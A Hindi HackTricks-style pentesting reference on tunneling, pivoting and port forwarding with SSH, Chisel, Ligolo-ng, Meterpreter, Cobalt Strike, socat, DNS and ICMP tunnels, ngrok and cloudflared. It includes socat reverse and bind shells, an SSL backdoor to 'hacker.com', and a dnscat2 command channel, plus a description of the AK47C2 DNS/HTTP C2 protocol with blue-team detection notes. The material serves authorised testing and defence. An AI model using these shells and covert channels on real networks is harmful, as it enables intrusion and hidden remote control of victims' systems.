# Tunneling और Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> Nmap का proxy support केवल TCP connections तक सीमित है और ping, port या OS-detection scans को प्रभावित नहीं करता। जब scanner किसी SOCKS proxy के पीछे हो, **host discovery अक्षम करें** (`-Pn`) और **TCP connect scan** (`-sT`) का उपयोग करें।<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

अंतिम command account और WinRM host की पहचान करने के लिए Evil-WinRM के `-u` और `-i` options का उपयोग करती है; इसका default WinRM port 5985 है।<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH अपने encrypted channel पर X11 connections, arbitrary TCP ports और Unix-domain sockets को forward कर सकता है।<sup>[[6]](#references)</sup>

SSH ग्राफिकल connection (X)

`-Y` trusted X11 forwarding को enable करता है और `-C` forwarded data के लिए compression का अनुरोध करता है।<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

SSH Server में नया Port खोलें --> Other port

Remote (`-R`) forwarding SSH server पर listen करता है और local side से connect होता है; explicit bind address यह नियंत्रित करता है कि कौन-से interfaces उस listener तक पहुंच सकते हैं।<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port

Local (`-L`) forwarding क्लाइंट पर listen करता है और SSH server side से destination से connect होता है।<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Wherever

Dynamic (`-D`) forwarding एक local SOCKS4/SOCKS5 listener बनाता है, जिसके connections remote side से खोले जाते हैं।<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

यह आपके host तक DMZ के माध्यम से internal hosts से reverse shells प्राप्त करने के लिए उपयोगी है:

Server की `GatewayPorts` setting यह नियंत्रित करती है कि remote forward loopback से आगे bind कर सकता है या नहीं; इसका default `no` है।<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

यह root-आधारित उदाहरण दोनों hosts पर tunnel devices बनाता है। Server को tun forwarding की अनुमति देनी होगी और चयनित account के पास tun device का access होना चाहिए; यहां `root` account का उपयोग करने के लिए `PermitRootLogin yes` एक तरीका है।<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Server side पर forwarding सक्षम करें
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
क्लाइंट साइड पर एक नया route सेट करें
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **सुरक्षा – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 ने Terrapin के early-transport integrity attack का मुकाबला करने के लिए strict-KEX extension जोड़ा। जहां संभव हो, दोनों peers को update करें और पुराने implementations के लिए vendor guidance का पालन करें, बजाय इसके कि केवल version के आधार पर forwarded channel को protected मान लिया जाए।<sup>[[8]](#references)</sup>

## SSHUTTLE

आप किसी host के माध्यम से **ssh** का उपयोग करके **subnetwork** के सभी **traffic** को **tunnel** कर सकते हैं।\
उदाहरण के लिए, 10.10.10.0/24 पर जाने वाले सभी traffic को forward करना।

`sshuttle` SSH पर transparent proxying प्रदान करता है और नीचे दिखाए अनुसार subnets तथा custom SSH command चुनने की सुविधा देता है।<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Private key से connect करें
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit का `portfwd` local और remote forwarding को support करता है, जबकि इसका SOCKS proxy module session routes या `autoroute` के साथ काम करने के लिए है और इन examples में default रूप से port 1080 पर listen करता है।<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
एक और तरीका:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strike का Beacon, Beacon के माध्यम से SOCKS4a/SOCKS5 connections को relay कर सकता है; `rportfwd` compromised host पर bind करता है, जबकि `rportfwd_local` destination connection को Cobalt Strike client से initiate करता है।<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Team Server में उन interfaces पर एक port open करें, जिन्हें Beacon के माध्यम से traffic route करना चाहिए।<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> इस मामले में, **port Beacon host में खोला जाता है**, Team Server में नहीं, और traffic को Team Server तक भेजा जाता है और वहाँ से निर्दिष्ट host:port पर।<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Reverse-forwarding manual निम्न व्यवहार को नोट करता है:<sup>[[14]](#references)</sup>

- Beacon का reverse port forward **traffic को Team Server तक tunnel करने के लिए डिज़ाइन किया गया है, individual machines के बीच relay करने के लिए नहीं**।
- Traffic को **Beacon के C2 traffic के भीतर tunnel किया जाता है**, जिसमें P2P links भी शामिल हैं।
- High ports आमतौर पर privileged-port restrictions से बचते हैं, लेकिन target OS policy और existing listeners फिर भी लागू होते हैं।

### rPort2Port local

> [!WARNING]
> इस मामले में, **port Beacon host में खोला जाता है**, Team Server में नहीं, और **traffic Cobalt Strike client को भेजा जाता है** (Team Server को नहीं), और वहाँ से indicated host:port पर भेजा जाता है।<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

यह project `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` और `tunnel.php` जैसे web tunnel endpoints उपलब्ध कराता है; local proxy शुरू करने से पहले किसी एक supported endpoint को upload करें।<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

आप इसे [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) के releases page से download कर सकते हैं\
Chisel TCP/UDP traffic को SSH-protected connection के माध्यम से HTTP पर ले जाता है; compatible client/server builds का उपयोग करें और चयनित release के command syntax को verify करें।<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng quickstart proxy पर एक TUN interface, agent के लिए certificate-fingerprint validation और tunneled network के लिए route setup का दस्तावेज़ प्रदान करता है।<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding और Listening

Ligolo-ng agent पर ऐसे listeners जोड़ सकता है जो proxy-side address पर forward करते हैं, और इसकी reserved `240.0.0.0/4` range को route किया जा सकता है ताकि agent-local services तक पहुंचा जा सके।<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Agent के Local Ports तक Access
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot पीड़ित से reverse tunnel शुरू करता है और हमलावर के loopback address पर SOCKS4 proxy expose करता है; इसका README NTLM-proxy credentials और hash options को भी document करता है।<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy** के माध्यम से Pivot करें
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` और `PROXY` जैसे address types को संयोजित करता है; नीचे दिए गए उदाहरण उन documented endpoints को मिलाते हैं।<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks के माध्यम से Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat के माध्यम से Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
आप socat के documented `PROXY` address type का उपयोग करके एक **non-authenticated proxy** को traverse कर सकते हैं, इसके लिए victim के console में पिछली line के बजाय यह line execute करें।<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

दोनों तरफ certificates बनाएँ: Client और Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

स्थानीय SSH पोर्ट (22) को attacker host के 443 पोर्ट से कनेक्ट करें
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink PuTTY का command-line connection tool है, जिसमें `ssh` के समान SSH forwarding options होते हैं।<sup>[[22]](#references)</sup>

SSH port के लिए uppercase `-P` का उपयोग करें। `-pw` compatibility के लिए रखा गया है, लेकिन यह process list में password को उजागर करता है; जहाँ संभव हो, key authentication या `-pwfile` को प्राथमिकता दें।<sup>[[22]](#references)[[23]](#references)</sup>

चूँकि यह binary victim में execute होगी और यह एक SSH client है, reverse connection के लिए SSH service और port खोलें; निम्नलिखित `-R` का उपयोग करके locally accessible port को attacker's machine पर forward करता है।<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Persistent `portproxy` rules बनाते या बदलते समय host द्वारा आवश्यक permissions वाले context का उपयोग करें। Microsoft नीचे उपयोग किए गए `v4tov4` add, show और delete forms का documentation प्रदान करता है।<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

आपके पास **system पर RDP access** होना आवश्यक है।\
Download करें:

SocksOverRDP, किसी मौजूदा RDP session के माध्यम से SOCKS5 connection को ले जाने के लिए Remote Desktop Dynamic Virtual Channels का उपयोग करता है; client plugin `127.0.0.1:1080` पर listen करता है, जबकि server component RDP target पर चलता है।<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह tool Windows के Remote Desktop Service feature से `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC **RDP connection के माध्यम से packets को tunnel करने** के लिए जिम्मेदार है।
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

अपने client computer में **`SocksOverRDP-Plugin.dll`** को इस प्रकार load करें:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
अब हम **`mstsc.exe`** का उपयोग करके **RDP** के माध्यम से **victim** से **connect** कर सकते हैं, और हमें एक **prompt** मिलना चाहिए जिसमें बताया जाएगा कि **SocksOverRDP plugin** enabled है और यह **127.0.0.1:1080** पर **listen** करेगा।

**RDP** के माध्यम से **connect** करें और victim machine में `SocksOverRDP-Server.exe` binary को upload और execute करें:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
अब, अपनी machine (attacker) पर पुष्टि करें कि port 1080 listening है:
```
netstat -antb | findstr 1080
```
अब आप उस port के माध्यम से traffic को proxy करने के लिए [**Proxifier**](https://www.proxifier.com/) का उपयोग कर सकते हैं।<sup>[[26]](#references)</sup>

## Windows GUI Apps को Proxify करें

आप [**Proxifier**](https://www.proxifier.com/) का उपयोग करके Windows GUI Apps को proxy के माध्यम से navigate करा सकते हैं।<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers** में SOCKS server का IP और port जोड़ें।\
**Profile -> Proxification Rules** में proxify किए जाने वाले program का नाम और उन IPs के connections जोड़ें जिन्हें आप proxify करना चाहते हैं; Proxifier rules applications, target hosts और ports से match कर सकते हैं।<sup>[[27]](#references)</sup>

## NTLM proxy के माध्यम से Tunnel करें

पहले बताए गए tool, **Rpivot**, को NTLM-authenticating proxy के माध्यम से relay किया जा सकता है। **OpenVPN** भी auth file और NTLMv2 method के साथ configure किए जाने पर इसके माध्यम से route कर सकता है; यह proxy traversal है, proxy authentication का bypass नहीं।<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm upstream NTLM proxies के साथ authenticate करता है, local listeners expose करता है, और local tunnel port को किसी destination service से map कर सकता है; इसके बाद clients उस local port का उपयोग कर सकते हैं।<sup>[[29]](#references)</sup>\
उदाहरण के लिए, वह port 443 को forward करता है
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
अब, यदि आप उदाहरण के लिए victim में **SSH** service को port 443 पर listen करने के लिए सेट करते हैं, तो आप attacker के port 2222 के माध्यम से उससे connect कर सकते हैं।<sup>[[29]](#references)</sup>\
आप ऐसा **meterpreter** भी उपयोग कर सकते हैं जो localhost:443 से connect होता है, जबकि attacker port 2222 पर listen करता है।<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) Microsoft का .NET reverse-proxy toolkit है। आप इसे यहां पा सकते हैं: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)।<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine DNS queries के माध्यम से एक IPv4 tunnel बनाता है और TUN interfaces का उपयोग करता है; documented setup में दोनों ends पर इन interfaces को create करने के लिए आवश्यक privileges की जरूरत होती है।<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS transport में direct TCP की तुलना में अधिक overhead होता है और यह आमतौर पर धीमा होता है; आप इस tunnel के माध्यम से निम्न का उपयोग करके compressed SSH connection बना सकते हैं:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**इसे यहाँ से Download करें**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 DNS के माध्यम से एक encrypted command-and-control channel स्थापित करता है; नीचे दिए गए server और client commands इसके documented usage का अनुसरण करते हैं।<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell में**

आप PowerShell में dnscat2 client चलाने के लिए [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) का उपयोग कर सकते हैं; इसका README नीचे दिखाए गए `Start-Dnscat2` parameters का दस्तावेजीकरण करता है।<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat के साथ Port forwarding**

Dnscat2 का interactive `listen` command एक local listener को remote host और port से map करता है।<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS बदलें

Proxychains-ng dynamically linked TCP connections को hook करता है और UDP या ICMP को carry नहीं कर सकता; DNS proxying configurable है, इसलिए किसी निश्चित public resolver को मानने के बजाय installed `proxychains.conf` और resolver helper को inspect करें। Legacy `proxyresolv` scripts resolver चुनने के लिए `PROXY_DNS_SERVER` expose करती हैं; internal names की आवश्यकता होने पर pivot से reachable resolver का उपयोग करें।<sup>[[34]](#references)[[35]](#references)</sup>

## Go में Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor ने एक **dual-channel C2 ("AK47C2")** बनाया, जो *केवल* outbound **DNS** और **plain HTTP POST** traffic का दुरुपयोग करता है - corporate networks पर ये दो protocols शायद ही कभी blocked होते हैं।<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• एक random 5-character SessionID generate करता है (जैसे `H4T14`)।
• *task requests* के लिए `1` या *results* के लिए `2` prepend करता है और अलग-अलग fields (flags, SessionID, computer name) को concatenate करता है।
• प्रत्येक field को **ASCII key `VHBD@H` से XOR-encrypt**, hex-encode और dots के साथ glue किया जाता है - अंत में attacker-controlled domain जोड़ा जाता है:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests **TXT** (और fallback **MG**) records के लिए `DnsQuery()` का उपयोग करती हैं।
• जब response 0xFF bytes से अधिक हो जाता है, तो backdoor data को 63-byte pieces में **fragments** करता है और markers जोड़ता है:
`s<SessionID>t<TOTAL>p<POS>`, ताकि C2 server उन्हें फिर से क्रम में लगा सके।

2. **HTTP mode (AK47HTTP)**
• एक JSON envelope बनाता है:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• पूरे blob को XOR-`VHBD@H` → hex किया जाता है → header `Content-Type: text/plain` के साथ **`POST /`** के body के रूप में भेजा जाता है।
• Reply उसी encoding का अनुसरण करता है और `cmd` field को `cmd.exe /c <command> 2>&1` के साथ execute किया जाता है।

Blue Team notes
• असामान्य **TXT queries** पर ध्यान दें, जिनका पहला label लंबा hexadecimal हो और जो हमेशा एक rare domain पर समाप्त हों।
• ASCII-hex के बाद आने वाली constant XOR key को YARA से आसानी से detect किया जा सकता है: `6?56484244?484` (`VHBD@H` hex में)।
• HTTP के लिए ऐसे text/plain POST bodies को flag करें जो pure hex हों और जिनकी लंबाई two bytes का multiple हो।

{{#note}}
यह channel प्रत्येक sub-domain label को 63-octet DNS limit के भीतर रखता है, लेकिन protocol compliance अपने-आप इसे stealthy नहीं बनाती; rare domains, लंबे hexadecimal labels और query volume अब भी detection signals बने रहते हैं।<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans एक TUN device और ICMP echo requests का उपयोग करने वाले IPv4-over-ICMP tunnel को document करता है; setup के लिए interface create करने हेतु पर्याप्त privileges आवश्यक हैं।<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**इसे यहाँ से डाउनलोड करें**](https://github.com/utoni/ptunnel-ng.git)।

ptunnel-ng TCP connections को ICMP पर transport करता है और नीचे दिखाए गए `-p`, `-l`, `-r`, और `-R` options का उपयोग proxy, local listener, destination host और destination port के लिए करता है।<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) स्थानीय network services को secure tunnel के माध्यम से online उपलब्ध कराने वाला एक agent है; इसका CLI HTTP, TCP और file URL endpoints का documentation प्रदान करता है, और printed endpoint hostname endpoint और account के आधार पर अलग-अलग हो सकता है।<sup>[[39]](#references)</sup>

### Installation

- एक account बनाएँ: https://ngrok.com/signup
- Client download:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### मूल उपयोग

**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/)।

_आवश्यकता होने पर agent authentication और TLS options को भी support करता है।<sup>[[39]](#references)</sup>_

#### TCP Tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP का उपयोग करके files expose करना
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP calls की Sniffing

_ XSS,SSRF,SSTI ... के लिए उपयोगी_\
डिफ़ॉल्ट रूप से standalone agent अपना HTTP inspection interface `http://127.0.0.1:4040` पर expose करता है; यह interface HTTP traffic के लिए है।<sup>[[40]](#references)</sup>

#### Internal HTTP service की Tunneling

`--host-header=rewrite` option upstream HTTP `Host` header को local service से match करने के लिए rewrite करता है।<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml सरल configuration उदाहरण

यह ngrok Agent Config v2 का उपयोग करता है; named tunnels में `proto` और `addr` का उपयोग किया जाता है और इन्हें `ngrok start` के साथ शुरू किया जाता है।<sup>[[42]](#references)</sup> यह 3 tunnels खोलता है:

- 2 TCP
- /tmp/httpbin/ से static files exposition वाला 1 HTTP
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel का `cloudflared` connector outbound connections स्थापित करता है; published applications HTTP, HTTPS, TCP, SSH और RDP को route कर सकती हैं, जबकि quick tunnels HTTP development के लिए बनाए गए हैं।<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin (legacy mode)

legacy `--socks5` flag `cloudflared` को बताता है कि local origin SOCKS5 पर communicate करता है; यह local SOCKS5 listener create नहीं करता। managed tunnel के लिए, `originRequest.proxyType: socks` SOCKS5 origin handling configure करता है।<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### DNS के साथ Persistent tunnels

